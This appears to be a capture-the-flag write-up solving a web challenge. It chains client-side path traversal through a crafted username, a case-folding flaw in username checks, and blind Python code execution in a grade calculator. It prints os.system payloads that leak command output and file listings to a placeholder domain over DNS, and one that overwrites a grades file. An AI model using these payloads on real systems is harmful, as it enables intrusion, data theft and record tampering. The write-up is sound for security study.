# SOLUTION:

By viewing the source code of / you find a path called /routes where you can see all paths. If you test each of them you find that /waitlist as an access control issue.

On that page you can see how the links to accept or deny users are made. Since you know that the teacher denies user every minute you have to find a way to force her into accepting one of you user. Your username is direclty appended to the path without verification because of this you can exploit a Client Side Path Traversal by creating a user named foo/../../accept/attacker. So when the teacher clicks the link : http://localhost:8081/deny/foo/../../accept/attacker it results in http://localhost:8081/accept/attacker which gives the attacker access to the class.

The next bug wasn't really realistic but it was to test your attention to details. Once you gain access to the class you see the name of all users in the class which contains the user Teacher however when you try to access a page that only the teacher as access you get this error message : "
As user : {username} you cant approve or deny users only user : "teacher" does."

You can notice that your username if it had capital letters is lower cased same thing for the user Teacher. What you have to understand here is that the username validation is flawed since it lowers the characters before checking if they match with teacher. This means that you can re-exploit the CSPT to validate the user TEACHER for example.

Now that you are logged in and have gain access to the class as user TEACHER you also gain access to the grade page. Where there is a python calculator...

This python calculator contains a python code execution vulnerability sadly you will have to use OOB detection to exploit and confirm this vulnerability since its blind.

So here is how I would've exploited this :

First confirm the vuln with the payload :

```
__import__('os').system('host $(whoami).yoursite.com')
```

Then list files :

```
__import__('os').system('for i in $(ls) ; do host \"$i.yoursite.com\"; done')
```

Then list data directory :

```
__import__('os').system('for i in $(ls data) ; do host \"$i.yoursite.com\"; done')
```


Them edit gardes.json so Vincent's grade is over 90% :

```
__import__('os').system('echo "ewogICAgIlZpbmNlbnQiOiAyNy44NywKICAgICJDYXJsb3MiOiA4Ny42NywKICAgICJXaWVuZXIiOiA2MS44NiwKICAgICJuZXJkIjogMTAwLjAxCn0=" | base64 -d > data/grades.json')
```
